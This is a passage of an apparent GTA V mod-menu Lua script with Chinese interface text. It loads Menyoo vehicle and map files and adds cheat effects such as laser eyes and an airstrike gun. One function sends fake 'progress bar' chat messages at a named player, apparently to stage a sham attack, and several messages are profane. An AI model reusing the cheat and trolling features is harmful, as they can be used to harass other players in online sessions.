    async_http.init('icanhazdadjoke.com', '', function(data)
        joke = data
    end, function()
        joke = 'FAIL'
    end)
    async_http.add_header('Accept', 'text/plain')
    async_http.dispatch()
    while joke == "WIP" do 
        wait()
    end
    return joke
end
local function fake_chat_with_percentage_and_target(action)
    chat.send_message(action .. " ${name}. [||||            ] (25%)", false, true, true)
    wait(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||        ] (50%)", false, true, true)
    wait(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||||||    ] (75%)", false, true, true)
    wait(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||||||||| ] (89%)", false, true, true)
    wait(math.random(3000, 5000))
end
-------------------------------------``
-- FILE LIST
-------------------------------------

FileList = {
	dir = "",
	ext = "json",
	open = false,
	reference = 0,
	options = {},
	fileOpts = {},
	onClick = nil
}
FileList.__index = FileList

function FileList.new(parent, name, options, dir, ext, onClick)
	local self = setmetatable({dir = dir, ext = ext, options = options}, FileList)
	self.fileOpts = {}
	self.onClick = onClick

	self.reference = menu.list(parent, name, {}, "", function()
		self.open = true
		self:load()
	end, function()
		self.open = false
		self:clear()
	end)

	return self
end


function FileList:load()
	if not self.dir or not filesystem.exists(self.dir) then
		return
	end

	for _, path in ipairs(filesystem.list_files(self.dir)) do
		local name, ext = string.match(path, '^.+\\(.+)%.(.+)$')
		if not self.ext or self.ext == ext then self:createOpt(name, path) end
	end
end

function FileList:createOpt(fileName, path)
	local list = menu.list(self.reference, fileName, {}, "")

	for i, opt in ipairs(self.options) do
		menu.action(list, opt, {}, "", function() self.onClick(i, fileName, path) end)
	end

	self.fileOpts[#self.fileOpts+1] = list
end


function FileList:clear()
	if #self.fileOpts == 0 then
		return
	end

	for i, ref in ipairs(self.fileOpts) do
		menu.delete(ref); self.fileOpts[i] = nil
	end
end

function FileList:add(file, content)
	assert(self.dir ~= "", "tried to add a file to a null directory")
	if not filesystem.exists(self.dir) then
		filesystem.mkdir(self.dir)
	end

	local name, ext = string.match(file, '^(.+)%.(.+)$')
	local count = 1

	while filesystem.exists(self.dir .. file) do
		count = count + 1
		file = string.format("%s (%s).%s", name, count, ext)
	end

	local file <close> = assert(io.open(self.dir .. file, "w"))
	file:write(content)
end


function FileList:reload()
	self:clear()
	self:load()
end



---生成选项
slaxdom = require("lib.GTSCRIPTS.X")
slaxml = require("lib.GTSCRIPTS.Y")
lunajson = require("lib.GTSCRIPTS.L")
local iniparser = require("lib.GTSCRIPTS.S")
fail_text = "这文件不可以加载，可能是你妈的格式错了.滚去 Discord 上提交一份错误报告，并附上你刚刚尝试加载的载具文件."
instruction_text = "\n按住shift和ctrl，然后点击一个载具，从你的目录中删除这个载具.按住空格，点击一个载具，添加到你的收藏夹."


function request_anim_dict(dict)
    request_time = os.time()
    if not STREAMING.DOES_ANIM_DICT_EXIST(dict) then
        return
    end
    STREAMING.REQUEST_ANIM_DICT(dict)
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end

function request_model_load(hash)
    request_time = os.time()
    if not STREAMING.IS_MODEL_VALID(hash) then
        return
    end
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        if os.time() - request_time >= 10 then
            break
        end
        wait()
    end
end

function laser_eyes()
    local weaponHash = util.joaat("weapon_heavysniper_mk2")
    local dictionary = "weap_xs_weapons"
    local ptfx_name = "bullet_tracer_xs_sr"
    local camRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
    if PAD.IS_CONTROL_PRESSED(51, 51) then
        -- credits to jinxscript
        local inst = v3.new()
        v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
        local tmp = v3.toDir(inst)
        v3.set(inst, v3.get(tmp))
        v3.mul(inst, 1000)
        v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
        v3.add(inst, tmp)
        camAim_x, camAim_y, camAim_z = v3.get(inst)
        local ped_model = ENTITY.GET_ENTITY_MODEL(players.user_ped())
        local left_eye_id = 0
        local right_eye_id = 0
        pluto_switch ped_model do 
            case 1885233650:
            case -1667301416:
                left_eye_id = 25260
                right_eye_id = 27474
                break
            -- michael / story mode character
            case 225514697:
            -- imply they're using a story mode ped i guess. i dont know what else to do unless i have data on every single ped
            default:
                left_eye_id = 5956
                right_eye_id = 6468
        end
        local boneCoord_L = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), left_eye_id))
        local boneCoord_R = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(players.user_ped(), PED.GET_PED_BONE_INDEX(players.user_ped(), right_eye_id))
        if ped_model == util.joaat("mp_f_freemode_01") then 
            boneCoord_L.z += 0.02
            boneCoord_R.z += 0.02
        end
        camRot.x += 90
        request_ptfx_asset_lasereyes(dictionary)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camRot.x, camRot.y, camRot.z, 2, 0, 0, 0, false)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_L.x, boneCoord_L.y, boneCoord_L.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, players.user_ped(), false, true, 100, players.user_ped(), 0)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(boneCoord_R.x, boneCoord_R.y, boneCoord_R.z, camAim_x, camAim_y, camAim_z, 100, true, weaponHash, players.user_ped(), false, true, 100, players.user_ped(), 0)
    end
end

function renzhepao(on)
local renzhe = "missfbi1"
    local pao = "ledge_loop"
            while not STREAMING.HAS_ANIM_DICT_LOADED(renzhe) do 
                STREAMING.REQUEST_ANIM_DICT(renzhe)
                wait()
            end
            if on then
                menu.trigger_commands("walkspeed 3.1")
                menu.trigger_commands("superrun 0.75")
                menu.trigger_commands("grace on")
                TASK.TASK_PLAY_ANIM(players.user_ped(), renzhe, pao, 3, 3, -1, 51, 0, false, false, false)
                PED.SET_ENABLE_HANDCUFFS(players.user_ped(),on)
            else
                menu.trigger_commands("walkspeed 1")
                menu.trigger_commands("superrun 0")
                menu.trigger_commands("grace off")
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
                PED.SET_ENABLE_HANDCUFFS(players.user_ped(),off)
            end
        end
        function caidancargun()
        if PED.IS_PED_SHOOTING(players.user_ped()) then
            local entity = get_entity_player_is_aiming_at(players.user())
            if entity ~= NULL and ENTITY.IS_ENTITY_A_VEHICLE(entity) and request_control(entity, 1000) then
                local primary, secundary = get_random_colour(), get_random_colour()
                VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(entity, primary.r, primary.g, primary.b)
                VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(entity, secundary.r, secundary.g, secundary.b)
            end
        end
    end

function kxq()
    local hash <const> = util.joaat("weapon_airstrike_rocket")
	WEAPON.REQUEST_WEAPON_ASSET(hash, 31, 0)
	local raycastResult = get_raycast_result(1000.0)
	if raycastResult.didHit and PED.IS_PED_SHOOTING(players.user_ped()) then
		local pos = raycastResult.endCoords
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
			pos.x, pos.y, pos.z + 35.0,
			pos.x, pos.y, pos.z,
			200,
			true,
			hash,
			players.user_ped(), true, false, 2500.0
		)
	end
end

function shechuNPC()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
	local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
	if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then 
		pedspawn = PED.CREATE_RANDOM_PED(pos.x, pos.y, pos.z)
		ENTITY.SET_ENTITY_ROTATION(pedspawn, rot.x, rot.y, rot.z, 1, false)
		ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(pedspawn, 1, 0, 1000, 0, false, true, true, true)
	end
end


function hasValue( tbl, str )
    local f = false
    for i = 1, #tbl do
        if type( tbl[i] ) == "table" then
            f = hasValue( tbl[i], str )  --  return value from recursion
            if f then break end  --  if it returned true, break out of loop
        elseif tbl[i] == str then
            return true
        end
    end
    return f
end

-- credit to https://stackoverflow.com/questions/1426954/split-string-in-lua
function split_str(inputstr, sep)
    if sep == nil then
            sep = "%s"
    end
    local t={}
    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
            table.insert(t, str)
    end
    return t
end

function to_boolean(text)
    if text == 'true' or text == "1" then
        return true
    end
    return false
end

function get_element_text(el)
    local pieces = {}
    for _,n in ipairs(el.kids) do
      if n.type=='element' then pieces[#pieces+1] = get_element_text(n)
      elseif n.type=='text' then pieces[#pieces+1] = n.value
      end
    end
    return table.concat(pieces)
end


store_dir = filesystem.scripts_dir() .. '\\GTLuaScript\\'

vehicles_dir = store_dir .. '\\vehicles\\'
if not filesystem.is_dir(vehicles_dir) then
    filesystem.mkdir(vehicles_dir)
end


maps_dir = store_dir .. '\\maps\\'
if not filesystem.is_dir(maps_dir) then
    filesystem.mkdir(maps_dir)
end



function parse_xml(path)
    -- does this path even exist?
    if not filesystem.exists(path) then
        util.toast("错误XML文件.文件不存在?")
        return
    end
    -- break file into string
    local xml = io.open(path):read('*all')
    -- dom that shit ;)
    local dom = slaxdom:dom(xml, {stripWhitespace=true})
    -- return our dominant superior ;)
    return dom
end

all_vehicles = {}
all_maps = {}

favorite_vehicles = {}
favorite_maps = {}

function search_vehicle(query)
    local finds = {}
    for i, path in ipairs(filesystem.list_files(vehicles_dir)) do
        local v_name = path:gsub(vehicles_dir, '')
        if string.endswith(v_name, '.ini') or string.endswith(v_name, '.xml') or string.endswith(v_name, '.json') then
            if string.contains(string.lower(v_name), query) then
                finds[#finds + 1] = v_name
            end
        end
    end
    return finds
end

function search_map(query)
    local finds = {}
    for i, path in ipairs(filesystem.list_files(maps_dir)) do
        local m_name = path:gsub(maps_dir, '')
        if string.endswith(m_name, '.xml')then
            if string.contains(string.lower(m_name), query) then
                finds[#finds + 1] = m_name
            end
        end
    end
    return finds
end

local v_search_results_action 
local m_search_results_action

function get_file_type(file_path)
    local _, _, ext = string.match(file_path, "(.-)([^\\/]-%.?)[.]([^%.\\/]*)$")
    return ext
end

function load_vehicle(path)
    local ext = get_file_type(path) 
    pluto_switch ext do 
        case "xml": 
            menyoo_load_vehicle(path)
            break 
        case "ini":
            ini_load_vehicle(path:gsub(vehicles_dir, ''))
            break 
        case "json":
            json_load_vehicle(path)
            break 
        default:
            util.toast("这文件不支持 滚吧.")
    end
end

function load_map(path)
    local ext = get_file_type(path) 
    pluto_switch ext do 
        case "xml": 
            menyoo_load_map(path)
            break
        default:
            util.toast("This is not a supported file.")
    end
end

function favorite_vehicle(file_name)
    local full_path = vehicles_dir .. '\\' .. file_name
    local half_path = vehicles_dir .. '\\'
    os.rename(full_path, half_path .. '[F] ' .. file_name)
    util.toast(file_name .. " 添加到收藏夹!")
    get_all_vehicles_in_dir()
end

function favorite_map(file_name)
    local full_path = maps_dir .. '\\' .. file_name
    local half_path = maps_dir .. '\\'
    os.rename(full_path, half_path .. '[F] ' .. file_name)
    util.toast(file_name .. " 添加到收藏夹!")
    get_all_maps_in_dir()
end


function menyoo_preprocess_ped(ped, att_data, entity_initial_handles)
    local ped_data = {}
    isped = true
    entity = ped
    menyoo_preprocess_entity(ped, att_data)
    if #entity_initial_handles > 0 then
        entity_initial_handles[att_data['InitialHandle']] = ped
    end
    for a,b in pairs(att_data['PedProperties'].kids) do
        local name = b.name
        local val = get_element_text(b)
        if name == 'PedProps' or name == 'PedComps' or name == 'TaskSequence' then
            ped_data[name] = b 
        else
            ped_data[name] = val
        end
    end
    local task_data = {}
    if att_data['TaskSequence'] ~= nil then
        for a,b in pairs(att_data['TaskSequence'].kids) do
            for c,d in pairs(b.kids) do
                task_data[d.name] = get_element_text(d)
            end
        end
    end
    local props = menyoo_build_properties_table(ped_data['PedProps'].kids)
    for k,v in pairs(props) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        PED.SET_PED_PROP_INDEX(ped, k, tonumber(v[1]), tonumber(v[2]), true)
    end
    local comps = menyoo_build_properties_table(ped_data['PedComps'].kids)
    for k,v in pairs(comps) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        PED.SET_PED_COMPONENT_VARIATION(ped, k, tonumber(v[1]), tonumber(v[2]), tonumber(v[2]))
    end
    PED.SET_PED_CAN_RAGDOLL(ped, to_boolean(ped_data['CanRagdoll']))
    PED.SET_PED_ARMOUR(ped, ped_data['Armour'])
    WEAPON.GIVE_WEAPON_TO_PED(ped, ped_data['CurrentWeapon'], 999, false, true)
    -- skipping over relationship groups, fuck that shit, seriously
    -- anim shit
    if task_data['AnimDict'] ~= nil then
        request_anim_dict(task_data['AnimDict'])
        local duration = tonumber(task_data['Duration'])
        local flag = tonumber(task_data['Flag'])
        local speed = tonumber(task_data['Speed'])
        TASK.TASK_PLAY_ANIM(ped, task_data['AnimDict'], task_data['AnimName'], 8.0, 8.0, duration, flag, speed, false, false, false)
    elseif ped_data['AnimDict'] ~= nil then
        request_anim_dict(ped_data['AnimDict'])
        TASK.TASK_PLAY_ANIM(ped, ped_data['AnimDict'], ped_data['AnimName'], 8.0, 8.0, -1, 1, 1.0, false, false, false)
    end
end

function nil_handler(val, default)
    if val == nil then
        val = default
    end
    return val
end

function menyoo_preprocess_car(vehicle, data)
    local colors = menyoo_build_properties_table(data['Colours'].kids)
    local neons = menyoo_build_properties_table(data['Neons'].kids)
    local doorsopen = menyoo_build_properties_table(data['DoorsOpen'].kids)
    local doorsbroken = menyoo_build_properties_table(data['DoorsBroken'].kids)
    if data['TyresBursted'] ~= nil then
        local tyresbursted = menyoo_build_properties_table(data['TyresBursted'].kids)
        for k,v in pairs(tyresbursted) do
            -- fucking menyoo.. here they go mixing up wheel indexes with strings
            k = k:gsub('_', '')
            local cure_menyoo_aids = {['FrontLeft'] = 0, ['FrontRight'] = 1, [2] = 2, [3] = 3, ['BackLeft'] = 4, ['BackRight'] = 5, [6]=6, [7]=7, [8]=8}
            WIRI_VEHICLE.SET_VEHICLE_TYRE_BURST(vehicle, cure_menyoo_aids[k], false, 0.0)
        end
    end
    local mods = menyoo_build_properties_table(data['Mods'].kids)
    local mod_extras = menyoo_build_properties_table(data['ModExtras'].kids)
    if mod_extras ~= nil then 
        for k,v in pairs(mod_extras) do
            k = k:gsub('_', '')
            WIRI_VEHICLE.SET_VEHICLE_EXTRA(vehicle, k, not to_boolean(v))
        end
    end
    
    for k,v in pairs(neons) do
        local comp = {['Left']=0, ['Right']=1, ['Front']=2, ['Back']=3}
        WIRI_VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, comp[k], to_boolean(v))
    end

    WIRI_VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, tonumber(data['WheelType']))
    for k,v in pairs(mods) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, tonumber(k), tonumber(v[1]), to_boolean(v[2]))
    end


    for k,v in pairs(colors) do
        colors[k] = tonumber(v)
    end

    WIRI_VEHICLE.SET_VEHICLE_COLOURS(vehicle, colors['Primary'], colors['Secondary'])
    WIRI_VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, colors['Pearl'], colors['Rim'])
    WIRI_VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, colors['tyreSmoke_R'], colors['tyreSmoke_G'], colors['tyreSmoke_B'])
    WIRI_VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vehicle, colors['LrInterior'])
    WIRI_VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(vehicle, colors['LrDashboard'])
    local livery = tonumber(data['Livery'])
    if livery == -1 then
        livery = 0
    end
    WIRI_VEHICLE.SET_VEHICLE_LIVERY(vehicle, livery)
    WIRI_VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, data['NumberPlateText'])
    WIRI_VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, tonumber(data['NumberPlateTextIndex']))
    WIRI_VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, tonumber(data['WindowTint']))
    WIRI_VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, to_boolean(data['BulletProofTyres']))
    WIRI_VEHICLE. SET_VEHICLE_DIRT_LEVEL(vehicle, tonumber(data['DirtLevel']))
    WIRI_VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, tonumber(data['PaintFade']))
    WIRI_VEHICLE.SET_CONVERTIBLE_ROOF_LATCH_STATE(vehicle, tonumber(data['RoofState']))
    WIRI_VEHICLE.SET_VEHICLE_SIREN(vehicle, to_boolean(data['SirenActive']))
    WIRI_VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, to_boolean(data['EngineOn']), true, false)

    AUDIO.SET_VEHICLE_RADIO_LOUD(vehicle, to_boolean(data['IsRadioLoud']))
    WIRI_VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, tonumber(data['LockStatus']))
    if data['EngineHealth'] ~= nil then
        WIRI_VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, tonumber(data['EngineHealth']))
    end
end

function menyoo_build_properties_table(kids)
    if kids ~= nil then
        local table = {}
        for k,v in pairs(kids) do
            local name = v.name
            local val = get_element_text(v)
            table[name] = val
        end
        return table
    end
    return nil
end

function menyoo_load_map(path)
    local all_entities = {}
    util.toast("地图在加载别猴急！！！！！！！!...")
    local entity_initial_handles = {}
    local xml_tbl = parse_xml(path).root
    local data = {}
    for a,b in pairs(xml_tbl.kids) do
        local vproperties = {}
        local pproperties = {}
        local name = b.name
        local isvehicle = false
        local isped = false
        if name == 'ReferenceCoords' then
            for k,v in pairs(b.kids) do
                if v.name == 'X' then
                    mmblip_x = tonumber(get_element_text(v))
                elseif v.name == 'Y' then
                    mmblip_y = tonumber(get_element_text(v))
                elseif v.name == 'Z' then
                    mmblip_z = tonumber(get_element_text(v))
                end
            end
            mmblip = HUD.ADD_BLIP_FOR_COORD(mmblip_x, mmblip_y, mmblip_z)
            HUD.SET_BLIP_SPRITE(mmblip, 77)
            HUD.SET_BLIP_COLOUR(mmblip, 48)
        end
        if name == 'Placement' then
            for c,d in pairs(b.kids) do
                if d.name == 'PositionRotation' then
                    for e, f in pairs(d.kids) do
                        data[f.name] = get_element_text(f)
                    end
                elseif d.name == 'VehicleProperties' then
                    isvehicle = true
                    for n, p in pairs(d.kids) do
                        local prop_name = p.name
                        if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                            vproperties[prop_name] = p
                        else
                            vproperties[prop_name]  = get_element_text(p)
                        end
                    end
                elseif d.name == 'PedProperties' then
                    isped = true
                    pproperties[d.name] = d
                else
                    data[d.name] = get_element_text(d)
                end
            end
            mmpos = {}
            mmpos.x = tonumber(data['X'])
            mmpos.y = tonumber(data['Y'])
            mmpos.z = tonumber(data['Z'])
            mmrot = {}
            mmrot.pi = tonumber(data['Pitch'])
            mmrot.ro = tonumber(data['Roll'])
            mmrot.ya = tonumber(data['Yaw'])
            if STREAMING.IS_MODEL_VALID(data['ModelHash']) then
                local mment = 0
                if isvehicle then
                    request_model_load(data['ModelHash'])
                    mment = entities.create_vehicle(data['ModelHash'], mmpos, mmrot.ya)
                    menyoo_preprocess_entity(mment, data)
                    menyoo_preprocess_car(mment, vproperties)
                elseif isped then
                    request_model_load(data['ModelHash'])
                    mment = entities.create_ped(0, data['ModelHash'], mmpos, mmrot.ya)
                    menyoo_preprocess_ped(mment, pproperties, {})
                    menyoo_preprocess_entity(mment, data)
                else
                    request_model_load(data['ModelHash'])
                    mment = entities.create_object(data['ModelHash'], mmpos)
                    menyoo_preprocess_entity(mment, data)
                end
                table.insert(all_entities, mment)
                ENTITY.SET_ENTITY_ROTATION(mment, mmrot.pi, mmrot.ro, mmrot.ya, 2, true)
            else
                util.toast("发现一些无效的模型.确保你没有使用需要mods文件的XML.")
            end
        end
    end
    if mmblip == nil then 
        util.toast("这张图在加载时出了问题.请确保该XML是Menyoo制作的XML.")
        return 
    end
    mm_maproot = menu.list(loaded_maps_root, path:gsub(maps_dir, "") .. ' [' .. mmblip .. ']', {"lancespoonerloadedmaps" .. mmblip}, "加载过了奶奶的")
    menu.action(mm_maproot, "传送至此地图", {"menyoomteleportto" .. mmblip}, "传送至此地图.", function(on_click)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), mmpos.x, mmpos.y, mmpos.z, false, false, false)
    end)

    menu.action(mm_maproot, "删除地图", {"menyoomdelete" .. mmblip}, "", function(on_click)
        for k,v in pairs(all_entities) do
            entities.delete_by_handle(v)
        end
        menu.delete(mm_maproot)
        -- apparently remove blip is fucked, so we set sprite to invis as a failsafe
        util.remove_blip(mmblip)
    end)
    util.toast("地图他妈的加载完成.在地图上寻找一个粉粉的L.")
end

function menyoo_preprocess_entity(entity, data)
    data['Dynamic'] = nil_handler(data['Dynamic'], true)
    data['FrozenPos'] = nil_handler(data['FrozenPos'], true)
    data['OpacityLevel'] = nil_handler(data['OpacityLevel'], 255)
    data['IsInvincible'] = nil_handler(data['IsInvincible'], false)
    data['IsVisible'] = nil_handler(data['IsVisible'], true)
    data['HasGravity'] = nil_handler(data['HasGravity'], false)
    data['IsBulletProof'] = nil_handler(data['IsBulletProof'], false)
    data['IsFireProof'] = nil_handler(data['IsFireProof'], false)
    data['IsExplosionProof'] = nil_handler(data['IsExplosionProof'], false)
    data['IsMeleeProof'] = nil_handler(data['IsMeleeProof'], false)
    ENTITY.FREEZE_ENTITY_POSITION(entity, to_boolean(data['FrozenPos']))
    ENTITY.SET_ENTITY_ALPHA(entity, tonumber(data['OpacityLevel']), false)
    ENTITY.SET_ENTITY_INVINCIBLE(entity, to_boolean(data['IsInvincible']))
    ENTITY.SET_ENTITY_VISIBLE(entity, to_boolean(data['IsVisible']), 0)
    ENTITY.SET_ENTITY_HAS_GRAVITY(entity, to_boolean(data['HasGravity']))
    ENTITY.SET_ENTITY_PROOFS(entity, to_boolean(data['IsBulletProof']), to_boolean(data['IsFireProof']), to_boolean(data['IsExplosionProof']), false, to_boolean(data['IsMeleeProof']), false, true, false)
end

function menyoo_load_vehicle(path)
    our_ped = players.user_ped()
    local all_entities = {}
    local entity_initial_handles = {}
    local data = {}
    local vproperties = {}
    local xml_tbl = parse_xml(path).root
    local initial_handle_index = 0
    -- n appears to be the enum of the kid, k is the actual kid table
    for k,v in pairs(xml_tbl.kids) do
        local name = v.name
        if name == 'VehicleProperties' then
            for n, p in pairs(v.kids) do
                local prop_name = p.name
                if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                    vproperties[prop_name] = p
                else
                    vproperties[prop_name]  = get_element_text(p)
                end
            end
        else
            if name == 'SpoonerAttachments' then
                data[name] = v
            else
                local el_text = get_element_text(v)
                data[name] = el_text
            end
        end
    end
    if data['ModelHash'] == nil then 
        util.toast(fail_text)
        return 
    end
    request_model_load(data['ModelHash'])
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(our_ped, 0.0, 5.0, 0.0)
    local vehicle = entities.create_vehicle(data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(our_ped))
    table.insert(all_entities, vehicle)
    ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
    PED.SET_PED_INTO_VEHICLE(our_ped, vehicle, -1)
    if data['InitialHandle'] == nil then
        initial_handle_index = initial_handle_index + 1
        data['InitialHandle'] = initial_handle_index
    end
    entity_initial_handles[data['InitialHandle']] = vehicle
    -- apply natives that can apply to any entity
    menyoo_preprocess_entity(vehicle, data)
    menyoo_preprocess_car(vehicle, vproperties)
    -- vehicle-specific natives
    -- now for the attachments...
    local attachments = data['SpoonerAttachments']
    all_attachments = {}
    if attachments ~= nil then
        for a,b in pairs(attachments.kids) do
            local vproperties = {}
            -- each item here should be "attachment" element
            local att_data = {}
            for c,d in pairs(b.kids) do
                local name = d.name
                local val = get_element_text(d)
                if name == 'PedProperties' or name == 'Attachment' or name == 'TaskSequence' then
                    att_data[name] = d
                elseif name == 'VehicleProperties' then
                    for n, p in pairs(d.kids) do
                        local prop_name = p.name
                        if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                            vproperties[prop_name] = p
                        else
                            vproperties[prop_name]  = get_element_text(p)
                        end
                    end
                else
                    att_data[name] = val
                end
            end
            request_model_load(att_data['ModelHash'])
            -- 1 = ped, 2 = vehicle, 3 = object
            local attachment_info = menyoo_build_properties_table(att_data['Attachment'].kids)
            local entity = nil
            local isped = false
            if att_data['Type'] == '1' then
                local ped = entities.create_ped(0, att_data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(ourped))
                menyoo_preprocess_ped(ped, att_data, entity_initial_handles)
                entity = ped
            elseif att_data['Type'] == '2' then
                local veh = entities.create_vehicle(att_data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(ourped))
                entity = veh
                menyoo_preprocess_entity(veh, att_data)
                menyoo_preprocess_car(veh, vproperties)
            elseif att_data['Type'] == '3' then
                local obj = entities.create_object(att_data['ModelHash'], coords)
                entity = obj
                menyoo_preprocess_entity(obj, att_data)
                -- obj code
            end
            table.insert(all_entities, entity)
            ENTITY.SET_ENTITY_INVINCIBLE(entity, true)
            local bone = tonumber(attachment_info['BoneIndex'])
            local x = tonumber(attachment_info['X'])
            local y = tonumber(attachment_info['Y'])
            local z = tonumber(attachment_info['Z'])
            local pitch = tonumber(attachment_info['Pitch'])
            local yaw = tonumber(attachment_info['Yaw'])
            local roll = tonumber(attachment_info['Roll'])
            all_attachments[entity] = {}
            all_attachments[entity]['attachedto'] = attachment_info['AttachedTo']
            all_attachments[entity]['bone'] = bone
            all_attachments[entity]['x'] = x
            all_attachments[entity]['y'] = y
            all_attachments[entity]['z'] = z
            all_attachments[entity]['pitch'] = pitch
            all_attachments[entity]['yaw'] = yaw
            all_attachments[entity]['roll'] = roll
            all_attachments[entity]['isped'] = isped
        end
        for k, v in pairs(all_attachments) do
            ENTITY.ATTACH_ENTITY_TO_ENTITY(k, entity_initial_handles[v['attachedto']], v['bone'], v['x'], v['y'], v['z'], v['pitch'], v['roll'], v['yaw'], true, false, true, v['isped'], 2, true)
        end
    end
    local this_blip = HUD.ADD_BLIP_FOR_ENTITY(vehicle)
    HUD.SET_BLIP_SPRITE(this_blip, 77)
    HUD.SET_BLIP_COLOUR(this_blip, 47)
    local this_veh_root = menu.list(loaded_vehicles_root, path:gsub(vehicles_dir .. '\\', ''), {"lancespoonerv" .. vehicle}, "")
    menu.action(this_veh_root, "删除", {"deletelancespoonerv" .. vehicle}, "删除这辆载具.", function(on_click)
        for k,v in pairs(all_entities) do
            entities.delete_by_handle(v)
        end
        menu.delete(this_veh_root)
        util.remove_blip(this_blip)
    end)
    menu.action(this_veh_root, "传送至载具内", {"teleportemenyoov" .. vehicle}, "", function(on_click)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), vehicle, -1)
    end)
    return vehicle
end

function ini_preprocess_vehicle(vehicle, data, ini_type, veh_index) 
    -- vehicle is a handle to an already-spawned vehicle
    if ini_type == 1 then
        WIRI_VEHICLE.SET_VEHICLE_COLOURS(vehicle, data.Primary or 0, data.Secondary or 0)
        WIRI_VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, data.SmokeR or 0, data.SmokeG or 0, data.SmokeB or 0)
        WIRI_VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, data.NeonR or 0, data.NeonG or 0, data.NeonB or 0)
        WIRI_VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
        WIRI_VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, data.Dirt or 0)
        WIRI_VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, data.PaintFade or 0)
        WIRI_VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, data.Wheels or 0)
        WIRI_VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, data.Pearl or 0, data.WheelColor or 0)
        WIRI_VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, data.Tint or 0)

        if data['BulletProofTires'] == 1 then 
            WIRI_VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, false)
        end
        for i=1, 4 do 
            if data['Neon' .. i] == 1 then 
                WIRI_VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, i, true)
            end
        end

        for i=0, 48 do
            if data[i] ~= nil then 
                -- idk how we even determine if a car has custom tires in this format
                WIRI_VEHICLE.SET_VEHICLE_MOD(vehicle, i, data[i], false)
            end
        end

        for i=1, 9 do 
            WIRI_VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, if data['extra' .. i] == 0 then true else false)
        end

    elseif ini_type == 2 then
